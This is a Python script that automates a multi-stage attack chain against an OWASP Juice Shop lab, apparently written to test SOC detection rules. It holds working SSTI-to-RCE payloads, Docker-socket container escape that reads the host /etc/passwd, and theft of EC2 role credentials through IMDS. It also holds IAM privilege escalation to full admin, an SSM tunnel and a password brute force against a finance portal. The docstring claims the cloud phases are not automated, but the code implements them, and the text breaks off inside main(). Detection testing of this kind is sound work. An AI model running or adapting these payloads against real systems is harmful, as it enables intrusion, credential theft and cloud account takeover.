#!/usr/bin/env python3
"""
Scenario 3 (SSTI -> RCE -> Docker-socket -> container escape -> host) attack
runner for OWASP Juice Shop.

Replays the kill chain documented in "scenario 3 ssti to docker to host to
full cloud compromise.pdf" through the Juice Shop /profile Server-Side
Template Injection (SSTI) vulnerability, so it can be re-fired for detection
testing without pasting each payload by hand.

Every step is the same mechanism: the payload is stored as the profile
"username" (POST /profile), then GET /profile renders the server-side pug
template and *executes* the embedded JS, reflecting the result back in the
returned HTML. We fire the payload and read that result.

Phases (matching the PDF):
  A  SSTI -> RCE           prove server-side JS execution
  B  container recon       /.dockerenv, /proc/1/cgroup, mountinfo, env, netif
  C  docker socket probe   stat /var/run/docker.sock, query Docker API
  D  container escape      pull alpine, create 'pp' bound to host /etc/passwd,
                           start it, read its logs (= host /etc/passwd)
  E  imds cred theft       create a NetworkMode:host curl container that
                           steals the EC2 role credentials via IMDSv2

The cloud-abuse tail (Phase F/G in the PDF: iam:CreatePolicyVersion privilege
escalation, ssm port-forwarding, finance-portal brute force) is deliberately
NOT automated here -- CreatePolicyVersion actually escalates a live IAM policy
to admin, and the SSM/hydra steps are interactive and destructive. Those
CloudTrail-side actions are already detected by the 110800-series rules from
Scenario 2 (110806-110813); run them manually if you want to exercise those.

Standard library only. NOTE: transcribed from the PDF but not smoke-tested by
the author's environment -- verify the first run against Wazuh/ModSecurity.

Usage:
    python3 scenario3_attack_runner.py                 # run the whole chain
    python3 scenario3_attack_runner.py rce-proof        # run one step
    python3 scenario3_attack_runner.py --list           # show step names
    python3 scenario3_attack_runner.py --phase D         # run one phase
    python3 scenario3_attack_runner.py --target http://100.85.61.41

Side effects (these are the vulnerability, not bugs):
  - Creates real Docker containers on the target host ('pp' bound to the host
    /etc/passwd read-only, and 'imds-v2-creds-proof' on the host network).
    Clean them up on the target with:  docker rm -f pp imds-v2-creds-proof
  - Overwrites the test account's username on each step.
"""

import argparse
import base64
import json
import os
import pathlib
import re
import signal
import stat
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_TARGET = "http://100.85.61.41"
TIMEOUT = 20
TEST_EMAIL = "soar-s3-test@test.local"
TEST_PASSWORD = "SoarS3Test!2026"

# --- Phase F/G (cloud abuse + lateral movement) ---
AWS_REGION = "eu-north-1"
ACCOUNT_ID = "819404925444"
STOLEN_ROLE = "Scenario3-Ec2-S3Reader"
PRIV_ESC_POLICY_ARN = f"arn:aws:iam::{ACCOUNT_ID}:policy/Priv-EscalationPolicy"
REPORTING_INSTANCE = "i-06d2264262a773d3e"   # Reporting-EC2, the finance-portal host
FINANCE_LOCAL_PORT = 8080
FINANCE_URL = f"http://127.0.0.1:{FINANCE_LOCAL_PORT}"
FINANCE_USER = "finance_admin"
# Several wrong guesses first (to trip the 5-failures/60s brute-force rule),
# then the real password documented in the lab.
FINANCE_WORDLIST = ["admin", "password", "finance", "Finance2025", "changeme", "finance2026"]
CREDS_CACHE = pathlib.Path(__file__).with_name(".scenario3_stolen_creds.json")
ADMIN_POLICY_DOC = '{"Version":"2012-10-17","Statement":[{"Sid":"AdministratorAccessAfterPrivilegeEscalation","Effect":"Allow","Action":"*","Resource":"*"}]}'


def log(msg):
    print(f"[+] {msg}", flush=True)


def warn(msg):
    print(f"[!] {msg}", flush=True)


def request(method, url, headers=None, body=None):
    headers = dict(headers or {})
    if isinstance(body, (dict, list)):
        body = json.dumps(body).encode("utf-8")
        headers.setdefault("Content-Type", "application/json")
    elif isinstance(body, str):
        body = body.encode("utf-8")
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers or {})
    except urllib.error.URLError as e:
        warn(f"Request to {url} failed: {e}")
        return None, b"", {}


class Session:
    def __init__(self, target):
        self.target = target
        self.token = None

    def headers(self, extra=None):
        h = dict(extra or {})
        if self.token:
            h["Authorization"] = f"Bearer {self.token}"
            h["Cookie"] = f"token={self.token}"
        return h


def get_session(target, email=TEST_EMAIL, password=TEST_PASSWORD):
    session = Session(target)
    login_url = f"{target}/rest/user/login"
    status, body, _ = request("POST", login_url, body={"email": email, "password": password})
    if status != 200:
        log(f"Test account {email} not found -- registering it")
        status, body, _ = request("POST", f"{target}/api/Users", body={
            "email": email, "password": password, "passwordRepeat": password,
        })
        if status not in (200, 201):
            raise RuntimeError(f"Registration failed ({status}): {body[:300]}")
        status, body, _ = request("POST", login_url, body={"email": email, "password": password})
        if status != 200:
            raise RuntimeError(f"Login failed after registration ({status}): {body[:300]}")
    session.token = json.loads(body)["authentication"]["token"]
    log(f"Authenticated as {email}")
    return session


def fire_ssti(session, payload):
    """Store the payload as the profile username, then render /profile so the
    server-side pug template executes it. Returns the rendered HTML."""
    body = urllib.parse.urlencode({"username": payload})
    request("POST", f"{session.target}/profile",
            headers=session.headers({"Content-Type": "application/x-www-form-urlencoded"}),
            body=body)
    # GET /profile renders the pug template -> executes the stored payload.
    status, html, _ = request("GET", f"{session.target}/profile", headers=session.headers())
    return status, html


def extract_result(html):
    """Best-effort pull of the evaluated username out of the profile HTML.
    Juice Shop renders it inside the profile page; we return a short slice of
    any recognisable result text rather than parsing the full DOM."""
    if not html:
        return ""
    text = html.decode("utf-8", errors="replace")
    # The rendered username sits near the avatar; look for our known markers
    # first, else fall back to a compact snippet for eyeballing.
    return text


# ---------------------------------------------------------------------------
# Payloads -- verbatim from the Scenario 3 PDF. (name, phase, payload, marker)
# marker: a literal substring expected in the result on success ("" = none).
# ---------------------------------------------------------------------------

PAYLOADS = [
    # ---- Phase A: SSTI -> RCE ------------------------------------------------
    ("ssti-probe", "A",
     r'''#{6*6}''',
     "36"),
    ("ssti-nodeversion", "A",
     r'''#{global.process.version}''',
     ""),  # PDF notes: "No detection" -- kept to demonstrate the WAF gap
    ("ssti-procinfo", "A",
     r'''#{JSON.stringify({uid:global.process.getuid(),gid:global.process.getgid(),cwd:global.process.cwd(),node:global.process.version,platform:global.process.platform})}''',
     "uid"),
    ("rce-proof", "A",
     r'''#{Buffer.from(global.process.mainModule.require('child_process').execFileSync('/nodejs/bin/node',['-e','console.log("RCE_OK:"+process.version+":"+process.cwd())']).toString()).toString()}''',
     "RCE_OK"),

    # ---- Phase B: container recon -------------------------------------------
    ("recon-cwd", "B",
     r'''#{global.process.cwd()}''',
     "juice-shop"),
    ("recon-hostname", "B",
     r'''#{global.process.mainModule.require('os').hostname()}''',
     ""),
    ("recon-dockerenv", "B",
     r'''#{global.process.mainModule.require('fs').existsSync('/.dockerenv').toString()}''',
     "true"),
    ("recon-cgroup", "B",
     r'''#{Buffer.from(global.process.mainModule.require('fs').readFileSync('/proc/1/cgroup','utf8')).toString()}''',
     ""),
    ("recon-mountinfo", "B",
     r'''#{Buffer.from(global.process.mainModule.require('fs').readFileSync('/proc/self/mountinfo','utf8').split('\n').slice(0,20).join('\n')).toString('base64')}''',
     ""),
    ("recon-env", "B",
     r'''#{Buffer.from(Object.keys(global.process.env).sort().join('\n')).toString('base64')}''',
     ""),
    ("recon-netif", "B",
     r'''#{Buffer.from(JSON.stringify(global.process.mainModule.require('os').networkInterfaces(),null,2)).toString('base64')}''',
     ""),

    # ---- Phase C: docker socket probe ---------------------------------------
    ("docker-sock-stat", "C",
     r'''#{(function(){const fs=global.process.mainModule.require('fs');try{const s=fs.statSync('/var/run/docker.sock');return JSON.stringify({exists:true,isSocket:s.isSocket(),mode:(s.mode&511).toString(8),uid:s.uid,gid:s.gid})}catch(e){return e.message}})()}''',
     "isSocket"),
    ("docker-version", "C",
     r'''#{global.process.mainModule.require('child_process').execFileSync('/nodejs/bin/node',['-e',"const h=require('http');const q=h.request({socketPath:'/var/run/docker.sock',path:'/version',method:'GET'},r=>{r.pipe(process.stdout)});q.on('error',e=>console.log(e.message));q.end()"]).toString()}''',
     "ApiVersion"),
    ("docker-ps", "C",
     r'''#{global.process.mainModule.require('child_process').execFileSync('/nodejs/bin/node',['-e',"const h=require('http');const q=h.request({socketPath:'/var/run/docker.sock',path:'/containers/json',method:'GET'},r=>{r.pipe(process.stdout)});q.on('error',e=>console.log(e.message));q.end()"]).toString()}''',
     ""),

    # ---- Phase D: container escape ------------------------------------------
    ("docker-pull-alpine", "D",
     r'''#{global.process.mainModule.require('http').request({socketPath:'/var/run/docker.sock',path:'/images/create?fromImage=alpine&tag=3.20',method:'POST'},r=>r.resume()).end(),'alpine-pull-request-sent'}''',
     "alpine-pull-request-sent"),
    ("docker-create-pp", "D",
     r'''#{global.process.mainModule.require('child_process').execFileSync('/nodejs/bin/node',['-e',"const h=require('http'),b=JSON.stringify({Image:'alpine',Tty:true,Cmd:['cat','/p'],HostConfig:{Binds:['/etc/passwd:/p:ro']}}),q=h.request({socketPath:'/var/run/docker.sock',path:'/containers/create?name=pp',method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(b)}},r=>r.pipe(process.stdout));q.end(b)"]).toString()}''',
     "Id"),
    ("docker-start-pp", "D",
     r'''#{global.process.mainModule.require('child_process').execFileSync('/nodejs/bin/node',['-e',"const h=require('http');const q=h.request({socketPath:'/var/run/docker.sock',path:'/containers/pp/start',method:'POST'},r=>{process.stdout.write(String(r.statusCode));r.resume()});q.end()"]).toString()}''',
     "204"),
    ("docker-logs-pp", "D",
     r'''#{global.process.mainModule.require('child_process').execFileSync('/nodejs/bin/node',['-e',"require('http').get({socketPath:'/var/run/docker.sock',path:'/containers/pp/logs?stdout=1&stderr=1'},r=>r.pipe(process.stdout))"]).toString('base64')}''',
     ""),  # base64 of host /etc/passwd -- decoded and checked below

    # ---- Phase E: IMDS credential theft via host-network container ----------
    ("docker-imds-create", "E",
     r'''#{global.process.mainModule.require('child_process').execFileSync('/nodejs/bin/node',['-e',"const h=require('http');const b=JSON.stringify({Image:'curlimages/curl:latest',Tty:true,Entrypoint:['sh','-c'],Cmd:['TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"); ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/); echo Role=$ROLE; curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE'],HostConfig:{NetworkMode:'host'}});const q=h.request({socketPath:'/var/run/docker.sock',path:'/containers/create?name=imds-v2-creds-proof',method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(b)}},r=>r.pipe(process.stdout));q.end(b)"]).toString()}''',
     "Id"),
    ("docker-imds-start", "E",
     r'''#{global.process.mainModule.require('child_process').execFileSync('/nodejs/bin/node',['-e',"const h=require('http');const q=h.request({socketPath:'/var/run/docker.sock',path:'/containers/imds-v2-creds-proof/start',method:'POST'},r=>{process.stdout.write(String(r.statusCode));r.resume()});q.end()"]).toString()}''',
     "204"),
    ("docker-imds-logs", "E",
     r'''#{global.process.mainModule.require('child_process').execFileSync('/nodejs/bin/node',['-e',"require('http').get({socketPath:'/var/run/docker.sock',path:'/containers/imds-v2-creds-proof/logs?stdout=1&stderr=1'},r=>r.pipe(process.stdout))"]).toString('base64')}''',
     ""),  # base64 of AWS creds
]

BY_NAME = {name: (phase, payload, marker) for (name, phase, payload, marker) in PAYLOADS}
ORDER = [name for (name, _, _, _) in PAYLOADS]


def run_step(state, name):
    # Phase F/G steps are plain functions (they act on AWS, not the web app).
    if name in FUNC_STEPS:
        phase, func = FUNC_STEPS[name]
        log(f"[{phase}] {name}")
        func(state)
        return

    session = state["session"]
    phase, payload, marker = BY_NAME[name]
    log(f"[{phase}] {name}")
    status, html = fire_ssti(session, payload)
    result = extract_result(html)
    if marker and marker in result:
        # Show a little context around the marker so the proof is visible.
        idx = result.find(marker)
        snippet = result[max(0, idx - 10):idx + 80].replace("\n", " ")
        log(f"    -> {status}  MARKER FOUND: ...{snippet}...")
    elif marker:
        warn(f"    -> {status}  marker '{marker}' NOT found (may still have fired -- check Wazuh)")
    else:
        log(f"    -> {status}  fired (no marker to check; verify in Wazuh/profile page)")

    # For the two host-file / credential base64 dumps, try to decode & prove it.
    if name == "docker-logs-pp":
        _maybe_report_b64(result, needle="root:x:0:0", label="host /etc/passwd")
    if name == "docker-imds-logs":
        _maybe_report_b64(result, needle="AccessKeyId", label="stolen AWS credentials")
        _cache_stolen_creds(result)


def _maybe_report_b64(result, needle, label):
    """The logs payloads end in .toString('base64'); the rendered profile shows
    a long base64 blob. Try to find and decode it to prove exfiltration."""
    import re
    for chunk in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", result):
        try:
            decoded = base64.b64decode(chunk, validate=True).decode("utf-8", "replace")
        except Exception:
            continue
        if needle in decoded:
            log(f"    -> decoded {label}: {decoded[:120].strip()!r}...")
            return
    warn(f"    -> could not confirm {label} in response (payload still fired for detection)")


# ===========================================================================
# Phase F -- cloud abuse with the stolen role credentials (aws CLI subprocess)
# ===========================================================================

def _cache_stolen_creds(result):
    """Parse the AWS credentials out of the decoded IMDS container logs and cache
    them so Phase F/G can use them (survives across separate invocations).
    Uses per-field regex extraction -- robust to the IMDS format's spaces/CRLF and
    to the 'Role=...' line the container echoes before the JSON (which broke the
    earlier json.loads approach)."""
    text = None
    for chunk in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", result):
        try:
            decoded = base64.b64decode(chunk, validate=True).decode("utf-8", "replace")
        except Exception:
            continue
        if "AccessKeyId" in decoded:
            text = decoded
            break
    if text is None:
        text = result  # creds may be shown un-encoded in the response

    def field(name):
        m = re.search(r'"' + name + r'"\s*:\s*"([^"]+)"', text)
        return m.group(1) if m else None

    ak, sk, tok = field("AccessKeyId"), field("SecretAccessKey"), field("Token")
    if ak and sk:
        CREDS_CACHE.write_text(json.dumps({
            "AccessKeyId": ak, "SecretAccessKey": sk,
            "SessionToken": tok, "Expiration": field("Expiration"),
        }))
        os.chmod(CREDS_CACHE, stat.S_IRUSR | stat.S_IWUSR)
        log(f"    -> cached stolen credentials ({ak}) to {CREDS_CACHE}")
    else:
        warn("    -> could NOT parse credentials for caching; Phase F/G will lack creds")


def _stolen_env():
    if not CREDS_CACHE.exists():
        return None
    try:
        creds = json.loads(CREDS_CACHE.read_text())
    except Exception:
        return None
    env = dict(os.environ)
    env["AWS_ACCESS_KEY_ID"] = creds["AccessKeyId"]
    env["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
    if creds.get("SessionToken"):
        env["AWS_SESSION_TOKEN"] = creds["SessionToken"]
    env["AWS_DEFAULT_REGION"] = AWS_REGION
    # Never let an inherited profile override the explicit stolen keys.
    for var in ("AWS_PROFILE", "AWS_DEFAULT_PROFILE"):
        env.pop(var, None)
    return env


def _run_aws(args, env, timeout=40):
    try:
        r = subprocess.run(["aws"] + args, env=env, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError:
        warn("`aws` CLI not found on PATH -- Phase F/G need it.")
        return None, "", ""
    except subprocess.TimeoutExpired:
        warn("aws command timed out")
        return None, "", ""


def _need_stolen(state):
    env = _stolen_env()
    if not env:
        warn("No stolen credentials cached -- run docker-imds-logs first (Phase E).")
    return env


_soc_admin_checked = {}


def _soc_admin_available():
    """Best-effort, cheap check for whether a soc-admin AWS profile is even
    configured on THIS machine. Used only to gate the two lab-hygiene actions
    (version pruning, auto-revert) -- the actual attack never needs this.
    Cached so we only probe once per script run."""
    if "ok" in _soc_admin_checked:
        return _soc_admin_checked["ok"]
    env = dict(os.environ)
    env["AWS_PROFILE"] = "soc-admin"
    rc, _, _ = _run_aws(["sts", "get-caller-identity"], env, timeout=8)
    _soc_admin_checked["ok"] = (rc == 0)
    return _soc_admin_checked["ok"]


def step_cloud_whoami(state):
    """sts get-caller-identity with the stolen creds -> the identity pivot."""
    env = _need_stolen(state)
    if not env:
        return
    rc, out, err = _run_aws(["sts", "get-caller-identity"], env)
    log(f"    -> exit {rc}: {out.strip() or err.strip()}")


def step_cloud_enum_role(state):
    """Enumerate the compromised role's attached policies (recon before escalation)."""
    env = _need_stolen(state)
    if not env:
        return
    rc, out, err = _run_aws(["iam", "list-attached-role-policies", "--role-name", STOLEN_ROLE,
                             "--no-cli-pager"], env)
    log(f"    -> list-attached-role-policies exit {rc}: {out.strip() or err.strip()}")
    rc, out, err = _run_aws(["iam", "get-policy", "--policy-arn", PRIV_ESC_POLICY_ARN,
                             "--no-cli-pager"], env)
    log(f"    -> get-policy exit {rc}: {out.strip()[:300] or err.strip()}")


def step_cloud_escalate(state):
    """DESTRUCTIVE: abuse iam:CreatePolicyVersion + SetAsDefault to give the
    Priv-EscalationPolicy full admin (*:*). Gated behind --escalate. Fires
    CloudTrail rules 110807 (CreatePolicyVersion) -> 110808 (set as default).
    Then polls (via soc-admin, read-only) until the new permissions actually
    take effect -- IAM changes are eventually consistent and the very next
    admin call can otherwise get AccessDenied even though this step reported
    success."""
    if not state.get("escalate"):
        warn("Skipping privilege escalation (destructive). Re-run with --escalate to perform it.")
        warn("It sets Priv-EscalationPolicy default to admin *:* ; revert with --restore-policy.")
        return
    env = _need_stolen(state)
    if not env:
        return

    if _soc_admin_available():
        if not _prune_oldest_policy_version_if_at_cap():
            warn("    Aborting escalation -- could not confirm/clear the policy-version cap (see above).")
            warn("    Fix soc-admin auth (e.g. `aws sso login --profile soc-admin`) and re-run.")
            return
    else:
        warn("    No soc-admin profile on this machine -- skipping the version-cap housekeeping check "
             "(this is expected when running the attack from a separate/attacker VM).")
        warn("    If create-policy-version below fails with LimitExceeded, prune old versions from the "
             "operator machine (where soc-admin lives) -- see the LimitExceeded message for the exact commands.")

    log("    -> ESCALATING: create-policy-version --set-as-default (admin *:*) on Priv-EscalationPolicy")
    rc, out, err = _run_aws(["iam", "create-policy-version",
                             "--policy-arn", PRIV_ESC_POLICY_ARN,
                             "--policy-document", ADMIN_POLICY_DOC,
                             "--set-as-default", "--no-cli-pager"], env)
    log(f"    -> exit {rc}: {out.strip() or err.strip()}")
    if rc != 0:
        return
    state["escalated"] = True
    warn("    Priv-EscalationPolicy is now admin. Revert when done: --restore-policy")

    log("    -> waiting for IAM to propagate the new permissions (eventually consistent)...")
    for attempt in range(15):  # up to ~30s
        time.sleep(2)
        rc, _, _ = _run_aws(["iam", "list-users", "--no-cli-pager"], env, timeout=15)
        if rc == 0:
            log(f"    -> permissions active after ~{2 * (attempt + 1)}s")
            return
    warn("    -> permissions still not visible after 30s; later admin calls may still fail")


def _prune_oldest_policy_version_if_at_cap(profile="soc-admin"):
    """AWS caps customer-managed policies at 5 versions total. Repeated
    --escalate runs will eventually hit that cap and create-policy-version
    will fail with LimitExceeded. Delete the oldest non-default version first
    if we're about to hit it. Uses soc-admin (always has iam: rights), not
    the stolen role.

    Returns True if it's now safe to create a new version (either we were
    under the cap, or we successfully pruned), False if the version count
    could not even be checked (e.g. soc-admin's SSO session expired) --
    callers should NOT proceed to create-policy-version in that case, since
    it'll just waste a call and fail with a confusing LimitExceeded if we
    were actually at the cap."""
    env = dict(os.environ)
    env["AWS_PROFILE"] = profile
    env["AWS_DEFAULT_REGION"] = AWS_REGION
    rc, out, err = _run_aws(["iam", "list-policy-versions", "--policy-arn", PRIV_ESC_POLICY_ARN,
                             "--no-cli-pager"], env)
    if rc != 0:
        warn(f"    could not check policy version count ({err.strip()[:150]})")
        warn("    (is soc-admin's SSO session still valid? try: aws sso login --profile soc-admin)")
        return False
    try:
        versions = json.loads(out).get("Versions", [])
    except Exception:
        warn("    could not parse policy version list; proceeding anyway")
        return True
    if len(versions) < 5:
        return True
    oldest = min((v for v in versions if not v.get("IsDefaultVersion")),
                 key=lambda v: v.get("CreateDate", ""), default=None)
    if not oldest:
        warn("    at the 5-version cap but no non-default version found to prune")
        return False
    vid = oldest["VersionId"]
    warn(f"    Priv-EscalationPolicy is at the 5-version cap -- deleting oldest non-default version {vid}")
    rc, out, err = _run_aws(["iam", "delete-policy-version", "--policy-arn", PRIV_ESC_POLICY_ARN,
                             "--version-id", vid, "--no-cli-pager"], env)
    if rc != 0:
        warn(f"    could not delete {vid}: {err.strip()[:200]}")
        return False
    return True


def step_cloud_admin_recon(state):
    """Post-escalation admin discovery: enumerate users, instances, SSM targets.
    (list-users returns AccessDenied before escalation, or if IAM hasn't
    propagated the escalation yet -- that's expected in those cases.)"""
    env = _need_stolen(state)
    if not env:
        return
    for label, args in [
        ("iam list-users", ["iam", "list-users", "--no-cli-pager"]),
        ("ec2 describe-instances", ["ec2", "describe-instances", "--region", AWS_REGION,
                                    "--query", "Reservations[].Instances[].{Id:InstanceId,Name:Tags[?Key=='Name']|[0].Value,Ip:PrivateIpAddress,State:State.Name}",
                                    "--output", "text", "--no-cli-pager"]),
        ("ssm describe-instance-information", ["ssm", "describe-instance-information", "--region", AWS_REGION,
                                               "--query", "InstanceInformationList[].{Id:InstanceId,Name:ComputerName,Ping:PingStatus}",
                                               "--output", "text", "--no-cli-pager"]),
    ]:
        rc, out, err = _run_aws(args, env)
        log(f"    -> {label} exit {rc}: {(out.strip() or err.strip())[:400]}")


# ===========================================================================
# Phase G -- lateral movement: SSM port-forward + finance-portal brute force
# ===========================================================================

def _no_redirect_opener():
    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None
    return urllib.request.build_opener(_NoRedirect)


def _finance_login(opener, username, password):
    """POST /login. Success = 302 redirect; failure = 401. Returns (success, set_cookie)."""
    body = urllib.parse.urlencode({"username": username, "password": password}).encode()
    req = urllib.request.Request(f"{FINANCE_URL}/login", data=body, method="POST",
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        resp = opener.open(req, timeout=TIMEOUT)
        return (resp.status in (301, 302, 303)), resp.headers.get("Set-Cookie")
    except urllib.error.HTTPError as e:
        if e.code in (301, 302, 303):
            return True, (e.headers.get("Set-Cookie") if e.headers else None)
        return False, None  # 401 = bad creds
    except urllib.error.URLError as e:
        raise RuntimeError(f"finance portal unreachable at {FINANCE_URL} "
                           f"(is the SSM tunnel up?): {e}")


def _tunnel_up():
    try:
        _no_redirect_opener().open(f"{FINANCE_URL}/login", timeout=4)
        return True
    except urllib.error.HTTPError:
        return True  # something answered (401/redirect) -> port is open
    except Exception:
        return False


def _kill_tunnel(proc):
    """`aws ssm start-session` spawns a session-manager-plugin child process.
    proc.terminate() only signals the `aws` parent -- the plugin (and the
    actual local port-forward) can survive that and leak into the NEXT run,
    which then silently reuses a stale tunnel authorized under an old,
    possibly-already-reverted session. Kill the whole process group instead."""
    if proc is None:
        return
    try:
        pgid = os.getpgid(proc.pid)
        os.killpg(pgid, signal.SIGTERM)
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            os.killpg(pgid, signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass
    except Exception:
        proc.terminate()  # best-effort fallback


def _open_ssm_tunnel(state):
    """Auto-open the SSM port-forward to the finance-portal host using the stolen
    creds (which have ssm:StartSession after --escalate). Returns the Popen or None.
    Spawned in its own process group (start_new_session=True) so _kill_tunnel can
    reliably clean up the session-manager-plugin child too."""
    env = _stolen_env()
    if not env:
        return None
    params = json.dumps({"portNumber": ["8080"], "localPortNumber": [str(FINANCE_LOCAL_PORT)]})
    cmd = ["aws", "ssm", "start-session", "--target", REPORTING_INSTANCE,
           "--document-name", "AWS-StartPortForwardingSession",
           "--parameters", params, "--region", AWS_REGION]
    try:
        proc = subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True, start_new_session=True)
    except FileNotFoundError:
        warn("    aws / session-manager-plugin not available for auto-tunnel")
        return None
    deadline = time.time() + 20
    while time.time() < deadline:
        if proc.poll() is not None:
            out = (proc.stdout.read() if proc.stdout else "") or ""
            warn(f"    SSM tunnel exited early: {out.strip()[:200]}")
            return None
        line = (proc.stdout.readline() if proc.stdout else "") or ""
        if "Waiting for connections" in line:
            log("    -> SSM tunnel established")
            return proc
    _kill_tunnel(proc)
    warn("    SSM tunnel did not come up within 20s")
    return None


def _do_bruteforce():
    opener = _no_redirect_opener()
    log(f"    -> brute-forcing {FINANCE_USER} against {FINANCE_URL}/login ({len(FINANCE_WORDLIST)} passwords)")
    cookie = None
    for pw in FINANCE_WORDLIST:
        try:
            ok, set_cookie = _finance_login(opener, FINANCE_USER, pw)
        except RuntimeError as e:
            warn(f"    {e}")
            return
        if ok:
            log(f"    -> PASSWORD FOUND: {FINANCE_USER}:{pw}")
            cookie = set_cookie
            break
        log(f"    attempt {FINANCE_USER}:{pw} -> failed")
        time.sleep(0.5)
    else:
        warn("    no password in the wordlist worked")
        return
    # Read the dashboard with the authenticated session cookie.
    headers = {"Cookie": cookie.split(";")[0]} if cookie else {}
    try:
        resp = urllib.request.urlopen(urllib.request.Request(f"{FINANCE_URL}/", headers=headers), timeout=TIMEOUT)
        html = resp.read().decode("utf-8", "replace")
        if "Finance Dashboard" in html:
            revenue = re.search(r"EUR\s*([\d.,]+)", html)
            log(f"    -> dashboard accessed. Total revenue on page: {revenue.group(0) if revenue else 'n/a'}")
        else:
            warn("    -> logged in but dashboard content not recognised (check manually)")
    except Exception as e:
        warn(f"    -> could not load dashboard: {e}")


def step_lateral_bruteforce(state):
    """Open the SSM tunnel (or use an already-open one), then brute-force the
    Finance Portal login in pure Python -- generates the same finance_portal
    failed-login telemetry as hydra (fires 100321 -> 100323 -> 100324)."""
    tunnel = None
    if not _tunnel_up():
        log("    Finance portal not reachable -- attempting to auto-open the SSM tunnel...")
        tunnel = _open_ssm_tunnel(state)
        if tunnel is None:
            warn("Could not auto-open the tunnel. Open it manually in another terminal, then re-run this step:")
            warn(f"  aws ssm start-session --target {REPORTING_INSTANCE} "
                 f"--document-name AWS-StartPortForwardingSession "
                 f"--parameters '{{\"portNumber\":[\"8080\"],\"localPortNumber\":[\"{FINANCE_LOCAL_PORT}\"]}}' "
                 f"--region {AWS_REGION} --profile soc-admin")
            warn("(needs ssm:StartSession -- run --escalate first so the stolen role has it, or use soc-admin)")
            return
        time.sleep(2)  # let the local listener bind
    try:
        _do_bruteforce()
    finally:
        if tunnel is not None:
            _kill_tunnel(tunnel)
            log("    -> closed SSM tunnel")


def restore_policy():
    """Revert the privilege escalation: set Priv-EscalationPolicy default back to v2.
    Once escalation has succeeded, the STOLEN role is itself admin (*:* includes
    iam:SetDefaultPolicyVersion) -- so prefer reverting with those same stolen
    creds, exactly as a real attacker covering their tracks would. Only fall
    back to soc-admin if no (still-admin) stolen creds are cached, e.g. when
    running `--restore-policy` standalone well after the attack finished."""
    env = _stolen_env()
    source = "stolen (now-admin) role credentials"
    if env is None:
        env = dict(os.environ)
        env["AWS_PROFILE"] = "soc-admin"
        env["AWS_DEFAULT_REGION"] = AWS_REGION
        source = "soc-admin (no cached stolen creds found)"

    log(f"Restoring Priv-EscalationPolicy default to v2 (via {source})")
    rc, out, err = _run_aws(["iam", "set-default-policy-version",
                             "--policy-arn", PRIV_ESC_POLICY_ARN,
                             "--version-id", "v2", "--no-cli-pager"], env)
    log(f"  -> exit {rc}: {out.strip() or err.strip() or 'default reset to v2'}")

    if rc != 0 and source.startswith("stolen"):
        warn("  Revert via stolen creds failed (maybe they expired) -- retrying via soc-admin...")
        env = dict(os.environ)
        env["AWS_PROFILE"] = "soc-admin"
        env["AWS_DEFAULT_REGION"] = AWS_REGION
        rc, out, err = _run_aws(["iam", "set-default-policy-version",
                                 "--policy-arn", PRIV_ESC_POLICY_ARN,
                                 "--version-id", "v2", "--no-cli-pager"], env)
        log(f"  -> exit {rc}: {out.strip() or err.strip() or 'default reset to v2'}")

    if rc != 0:
        warn("If v2 was not the original safe version, check the policy's versions manually "
             "(from the operator machine, where soc-admin lives):")
        warn(f"  aws iam list-policy-versions --policy-arn {PRIV_ESC_POLICY_ARN} --profile soc-admin")


FUNC_STEPS = {
    "cloud-whoami": ("F", step_cloud_whoami),
    "cloud-enum-role": ("F", step_cloud_enum_role),
    "cloud-escalate": ("F", step_cloud_escalate),
    "cloud-admin-recon": ("F", step_cloud_admin_recon),
    "lateral-bruteforce": ("G", step_lateral_bruteforce),
}
FUNC_ORDER = ["cloud-whoami", "cloud-enum-role", "cloud-escalate", "cloud-admin-recon",
              "lateral-bruteforce"]


def _phase_of(name):
    return FUNC_STEPS[name][0] if name in FUNC_STEPS else BY_NAME[name][0]


def main():
    full_order = ORDER + FUNC_ORDER
    all_steps = set(BY_NAME) | set(FUNC_STEPS)
    parser = argparse.ArgumentParser(
        description="Fire the Scenario 3 SSTI->RCE->Docker-escape->cloud->lateral chain.")
    parser.add_argument("steps", nargs="*", default=["all"],
                         help="step(s) to run, or 'all' (default). See --list.")
    parser.add_argument("--target", default=DEFAULT_TARGET, help=f"base URL (default: {DEFAULT_TARGET})")
    parser.add_argument("--phase", help="run only one phase (A B C D E F G)")
    parser.add_argument("--delay", type=float, default=5.0,
                         help="seconds between steps (default: 5). Phase D/E container steps must "
                              "stay ordered; a few seconds is enough. Raise to ~150 only to test "
                              "SOAR case-dedup timing.")
    parser.add_argument("--escalate", action="store_true",
                         help="ACTUALLY perform the destructive IAM privilege escalation in the "
                              "cloud-escalate step (sets Priv-EscalationPolicy default to admin *:*). "
                              "Off by default. Revert afterwards with --restore-policy.")
    parser.add_argument("--restore-policy", action="store_true",
                         help="revert the escalation (set Priv-EscalationPolicy default back to v2, "
                              "via soc-admin) and exit.")
    parser.add_argument("--no-restore", action="store_true",
                         help="with --escalate, do NOT auto-revert the escalation at the end "
                              "(leave the policy escalated for inspection).")
    parser.add_argument("--list", action="store_true", help="list step names and exit")
    args = parser.parse_args()

